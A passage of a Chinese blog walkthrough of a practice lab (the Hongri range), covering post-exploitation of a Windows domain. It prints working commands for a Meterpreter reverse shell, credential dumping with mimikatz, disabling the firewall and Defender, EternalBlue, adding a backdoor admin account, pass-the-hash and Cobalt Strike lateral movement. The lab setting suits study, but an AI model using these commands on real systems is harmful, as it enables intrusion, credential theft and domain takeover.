+<h5 id="yxcms-xss"><a href="#yxcms-xss" class="headerlink" title="yxcms xss"></a><strong>yxcms xss</strong></h5><p>留言板中还有一个<strong>xss</strong>，在后台审核时触发</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183755092.png" alt="image-20230801183755092" style="zoom:45%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183931382.png" alt="image-20230801183931382" style="zoom:33%;">
+
+
+
+<h3 id="三、后渗透"><a href="#三、后渗透" class="headerlink" title="三、后渗透"></a>三、后渗透</h3><p>后渗透阶段，当我们已经将小马上传到web服务器上时，可以用webshell管理工具进行下一步渗透了。</p>
+<h4 id="1-msf上线"><a href="#1-msf上线" class="headerlink" title="1. msf上线"></a>1. msf上线</h4><p>这里的思路是将shell派送给CS或者msf进行下一步渗透。<br>使用msf生成exe并开启监听(也可以用cs生产exe)：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.85.128 LPORT=1234 -f exe -o /home/bamboo/桌面/hack.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>先用kali生成hack.exe文件，放在桌面上方便我们一会儿用蚁剑传</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225517553.png" alt="image-20230809225517553" style="zoom:50%;">
+
+<p>将刚刚生成的**.exe**文件传上去</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225654725.png" alt="image-20230809225654725" style="zoom:50%;">
+
+<p>打开msf，开启监听</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfdb run</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.85.128</span><br><span class="line">set lport 1234</span><br><span class="line">exploit -j(后台)允许</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在蚁剑中打开命令行，执行刚刚上传的<strong>hack.exe</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225809784.png" alt="image-20230809225809784" style="zoom:55%;">
+
+<p>收到<strong>shell</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225947579.png" alt="image-20230809225947579" style="zoom:50%;">
+
+<p><strong>查看会话</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="2-msf信息搜集"><a href="#2-msf信息搜集" class="headerlink" title="2.msf信息搜集"></a>2.msf信息搜集</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.msf arp 发现主机</span><br><span class="line">run arp_scanner -r  192.168.85.0/24</span><br><span class="line">2.查看msf的提权</span><br><span class="line">run post/multi/recon/local_exploit_suggester      查看msf的提权</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h4><p><strong>获取system权限</strong></p>
+<p>进来后第一步肯定是提权到system：<br>这里直接是administrator，所有可以直接提到system，实战中还需要其他手段提权。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid查看服务器权限</span><br><span class="line">getsystem 提权</span><br><span class="line">getuid 查看是否提权成功</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812110538827.png" alt="image-20230812110538827" style="zoom:50%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812110558781.png" alt="image-20230812110558781" style="zoom:50%;">
+
+<h4 id="4-抓取域用户的密码信息"><a href="#4-抓取域用户的密码信息" class="headerlink" title="4.抓取域用户的密码信息"></a>4.抓取域用户的密码信息</h4><h5 id="1-导入账号、密码hash值"><a href="#1-导入账号、密码hash值" class="headerlink" title="1.导入账号、密码hash值"></a>1.导入账号、密码hash值</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run hashdump   这条命令报错，网上搜了一下换一个</span><br><span class="line">run windows/gather/smart_hashdump</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coderge/p/13752193.html">Metasploit之Hash攻击</a></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812115509703.png" alt="image-20230812115509703" style="zoom:50%;">
+
+<h5 id="2-mimikatz"><a href="#2-mimikatz" class="headerlink" title="2.mimikatz"></a>2.mimikatz</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">加载mimikatz模块</span><br><span class="line">Windows10/2012 以下的版本可以直接抓取明文密码</span><br><span class="line">	再尝试加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，</span><br><span class="line">	而且该进程也需要 是system权限运行的。 </span><br><span class="line">	ps 查看进程</span><br><span class="line">migrate PID </span><br><span class="line">load mimikatz </span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line">如果还是不行就用下面这两个</span><br><span class="line">creds_tspkg</span><br><span class="line">kiwi_cmd -f sekurlsa::searchpasswords</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/X_sweelg/article/details/117480834">msf 使用mimikatz获取明文密码过程中获取密码失败</a></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812122533053.png" alt="image-20230812122533053" style="zoom:50%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812122605873.png" alt="image-20230812122605873" style="zoom:50%;">
+
+<h5 id="3-kiwi"><a href="#3-kiwi" class="headerlink" title="3.kiwi"></a>3.kiwi</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load wiki</span><br><span class="line">creds_all</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="5-3389连接"><a href="#5-3389连接" class="headerlink" title="5.3389连接"></a>5.3389连接</h4><p>开启3389:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812123202366.png" alt="image-20230812123202366" style="zoom:50%;">
+
+<p>测试</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 3389 192.168.85.133</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812170836053.png" alt="image-20230812170836053" style="zoom:50%;">
+
+
+
+<h4 id="6-跨网段横向渗透"><a href="#6-跨网段横向渗透" class="headerlink" title="6.跨网段横向渗透"></a>6.跨网段横向渗透</h4><h5 id="6-1-msf-socks4a-proxychains-穿透内网"><a href="#6-1-msf-socks4a-proxychains-穿透内网" class="headerlink" title="6.1 msf socks4a proxychains 穿透内网"></a>6.1 msf socks4a proxychains 穿透内网</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.52.0/24      添加路由</span><br><span class="line">route autorout -p                       查看是否添加成功 </span><br><span class="line">background                            返回</span><br><span class="line">route print			                  输出路由</span><br><span class="line">use auxiliary/server/socks4a  		  使用 socks4a模块</span><br><span class="line">set srvport 1080		              设置端口1080</span><br><span class="line">run		                              运行</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set VERSION 4a</span><br><span class="line">set SRVHOST 127.0.0.1</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812171730913.png" alt="image-20230812171730913" style="zoom:50%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812174111736.png" alt="image-20230812174111736" style="zoom:50%;">
+
+<p>配置proxychains：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812174553038.png" alt="image-20230812174553038" style="zoom:50%;">
+
+<h5 id="6-2测试是否成功"><a href="#6-2测试是否成功" class="headerlink" title="6.2测试是否成功"></a>6.2测试是否成功</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl 192.168.52.143</span><br><span class="line">访问成功 说明 代理添加成功</span><br><span class="line">proxychains nmap -sT -Pn 192.168.52.143</span><br></pre></td></tr></tbody></table></figure>
+
+<p>之前打了一天都没成功，后面重新试终于成功了:sob:</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815112343253.png" alt="image-20230815112343253" style="zoom:50%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815113019102.png" alt="image-20230815113019102" style="zoom:50%;">
+
+<h5 id="6-3内网信息搜集"><a href="#6-3内网信息搜集" class="headerlink" title="6.3内网信息搜集"></a>6.3内网信息搜集</h5><p>arp 探测内网存活主机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line">set SESSION 1</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812231209986.png" alt="image-20230812231209986" style="zoom:50%;">
+
+<p>udp协议发现内网存活主机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812232257127.png" alt="image-20230812232257127" style="zoom:50%;">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">结合发现内网内共存在三台主机</span><br><span class="line"></span><br><span class="line">192.168.52.138/24</span><br><span class="line">192.168.52.141/24</span><br><span class="line">192.168.52.143/24</span><br><span class="line"></span><br><span class="line">查看域信息：net view</span><br><span class="line">查看主域信息：net view /domain</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>开始横向渗透控制其它主机<br>进行其它内网主机端口探测</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p 0-1000 -Pn -sT 192.168.52.141</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>有防火墙（-PN、-sT必须加）</p>
+</blockquote>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815171151869.png" alt="image-20230815171151869" style="zoom:50%;">
+
+<p>也可以使用 MSF 自带<code>auxiliary/scanner/portscan/tcp</code>模块扫描内网域成员主机开放的端口：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span></span><br><span class="line"><span class="built_in">set</span> ports <span class="number">80</span>,<span class="number">135</span><span class="number">-139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815172304874.png" alt="image-20230815172304874" style="zoom:50%;">
+
+<p>同样看到了开放的端口</p>
+<p>开放了445端口，所以利用<code>use auxiliary/scanner/smb/smb_version</code>可以扫描系统版本，扫描结果是win2003</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815172641128.png" alt="image-20230815172641128" style="zoom:50%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815174319955.png" alt="image-20230815174319955" style="zoom: 50%;">
+
+<p>扫出版本为<strong>Windows2003</strong>和<strong>Windows2008</strong></p>
+<h5 id="6-4永恒之蓝攻击"><a href="#6-4永恒之蓝攻击" class="headerlink" title="6.4永恒之蓝攻击"></a>6.4永恒之蓝攻击</h5><p><strong>使用msf辅助模块进行扫描，查看是否存在ms17-010漏洞</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/</span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line">set threads 500</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815175514016.png" alt="image-20230815175514016" style="zoom:50%;">
+
+<p>三台机器都存在ms17-010</p>
+<p>也可以用下面这种方法：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp</span><br><span class="line">set rhosts 192.168.52.141 #设置被扫描的主机IP</span><br><span class="line">run  #进行扫描，观察是否存在该漏洞</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816164945947.png" alt="image-20230816164945947" style="zoom:50%;">
+
+<p>发下内网的两台主机都存在永恒之蓝，接下来用poc攻击，尝试拿一个shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816165237455.png" alt="image-20230816165237455" style="zoom:50%;">
+
+<p>但是没有shell会话弹回来</p>
+<p>看网上说是跳板机 Win7 的防火墙导致的，所以返回 Win7 的 Shell 会话并执行命令关闭跳板机的防火墙功能：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions -l #查看所有会话</span><br><span class="line">sessions 4  #进入会话4中</span><br><span class="line">shell</span><br><span class="line">netsh advfirewall set allprofiles state off #关闭防火墙</span><br><span class="line">net stop windefend #关闭Windows defender</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/typora笔记/图片/image-20230816165811463.png" alt="image-20230816165811463" style="zoom: 50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816165847539.png" alt="image-20230816165847539" style="zoom: 50%;"></p>
+<p>可以看到win7那边收到关闭防火墙的提示</p>
+<p>继续用永恒之蓝打</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816170709465.png" alt="image-20230816170709465" style="zoom:50%;">
+
+<p>还是弹不会shell会话:sob:</p>
+<p>但是看到可以使用远程桌面</p>
+<p>server2003这台主机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">set command net user Yokan !@#123qwe!@# /add #添加用户</span><br><span class="line">run #成功执行</span><br><span class="line">set command net localgroup administrators Yokan /add #管理员权限</span><br><span class="line">run #成功执行</span><br><span class="line">set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span><br><span class="line">run #成功执行</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815183217979.png" alt="image-20230815183217979" style="zoom:50%;">
+
+<p>这里特别注意，因为开启3389端口命令中有两个双引号，如果整条命令外面不用单引号扩一下，会出现一些符号闭合上的问题</p>
+<p> 然后使用proxychains连接 </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用刚刚设置的账号密码登陆成功</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815184007250.png" alt="image-20230815184007250" style="zoom:50%;">
+
+
+
+
+
+<h4 id="7-MSF哈希传递攻击PTH"><a href="#7-MSF哈希传递攻击PTH" class="headerlink" title="7.MSF哈希传递攻击PTH"></a>7.MSF哈希传递攻击PTH</h4><p>上面既然通过永恒之蓝漏洞难以获得域控主机的 Shell，那就换一种攻击思路拿下域控吧，下面尝试通过哈希传递攻击 PTH 拿下域控主机。PTH 的相关概念和知识参见：<a target="_blank" rel="noopener" href="https://bwshen.blog.csdn.net/article/details/118338328">浅析Windows域环境身份认证与攻击思路</a>。</p>
+<p><strong>[哈希传递攻击]<strong>在 <code>kerberos</code>、<code>NTLM </code>认证过程的关键，首先就是基于用户密码 <strong>Hash</strong> 的加密，所以在域渗透中，无法破解用户密码 <strong>Hash</strong> 的情况下，也可以直接利用 <strong>Hash</strong> 来完成认证，达到攻击的目的，这就是 hash 传递攻击（</strong>Pass The Hash</strong>，简称 <strong>PTH</strong>）。如果内网主机的本地管理员账户密码相同，那么可以通过 <strong>PTH</strong> 远程登录到任意一台主机，操作简单、威力无穷。</p>
+<p>在域环境中，利用哈希传递攻击的渗透方式往往是这样的：</p>
+<ol>
+<li>获得一台域主机的权限，<strong>Dump</strong> 内存获得该主机的用户密码 <strong>Hash</strong> 值；</li>
+<li>通过哈希传递攻击尝试登录其他主机；</li>
+<li>继续搜集 <strong>Hash</strong> 并尝试远程登录，直到获得域管理员账户 <strong>Hash</strong>，登录域控，最终成功控制整个域。</li>
+</ol>
+<p>之前已经获取了Administrator 管理员账户的密码信息</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812122605873.png" alt="image-20230812122605873" style="zoom:50%;">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM: 6eda2e2c452f2be8da7e73a8c1b5bd0d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>以<code>exploit/windows/smb/psexec</code>模块哈希传递攻击 Windows Server 2008 为例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 00000000000000000000000000000000:6eda2e2c452f2be8da7e73a8c1b5bd0d</span><br><span class="line">set smbdomain god</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816174628380.png" alt="image-20230816174628380" style="zoom:50%;">
+
+<p>还是没成功:sob:</p>
+<h4 id="8-CS上线"><a href="#8-CS上线" class="headerlink" title="8.CS上线"></a>8.CS上线</h4><p>之前没有成功，换一种打法，用CS</p>
+<p>一开始安装的4.0版本，但是添加<strong>lisenner</strong>的时候有bug，于是换了一个4.7版本， 链接[CobaltStrike4.7](<a target="_blank" rel="noopener" href="https://download.csdn.net/download/weixin_53912233/86890411?ops_request_misc=%7B%22request_id%22:%22169220222216800211551748%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&amp;request_id=169220222216800211551748&amp;biz_id=1&amp;utm_medium=distribute.pc_search_result.none-task-download-2~all~first_rank_ecpm_v1~rank_v31_ecpm-7-86890411-null-null.142%5Ev92%5EcontrolT0_1&amp;utm_term=kali">https://download.csdn.net/download/weixin_53912233/86890411?ops_request_misc=%7B%22request%5Fid%22%3A%22169220222216800211551748%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=169220222216800211551748&amp;biz_id=1&amp;utm_medium=distribute.pc_search_result.none-task-download-2~all~first_rank_ecpm_v1~rank_v31_ecpm-7-86890411-null-null.142^v92^controlT0_1&amp;utm_term=kali</a> cobalt strike下载&amp;spm=1018.2226.3001.4187.8)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.85.128 1234567</span><br><span class="line">./start.sh</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816221506922.png" alt="image-20230816221506922" style="zoom: 67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/3074366-20230315202803226-19896095.png" alt="img" style="zoom: 80%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816221902658.png" alt="image-20230816221902658" style="zoom: 50%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816221933965.png" alt="image-20230816221933965" style="zoom: 67%;">
+
+<p>生成一个<strong>artifact.exe</strong>文件，用蚁剑上传并执行，kali端成功上线</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816222406111.png" alt="image-20230816222406111" style="zoom: 67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816222442436.png" alt="image-20230816222442436" style="zoom: 67%;">
+
+<p>点击<strong>process–&gt;Explore–&gt;Net View</strong>，探测内网存活主机</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816223630022.png" class="" title="image-20230816223630022">
+
+<p>点击<strong>Access–&gt;Run Mimikatz</strong>抓取本机用户密码</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816224241233.png" alt="image-20230816224241233" style="zoom:50%;">
+
+<p>点击瞄准镜图标可以看到三台主机</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816224712049.png" class="" title="image-20230816224712049">
+
+<p>选择138，点击<strong>jump–&gt;psexec</strong>,新建一个<strong>lisenner</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817004307897.png" alt="image-20230817004307897" style="zoom:60%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816231130701.png" alt="image-20230816231130701" style="zoom:67%;">
+
+<p>收到shell</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817004335830.png" class="" title="image-20230817004335830">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817004645964.png" class="" title="image-20230817004645964">
+
+<p>拿下域控:happy:</p>
+<p>点击<strong>Explore–&gt;File Browser</strong> 进入文件管理， 可以进行上传文件操作</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817003910028.png" class="" title="image-20230817003910028">
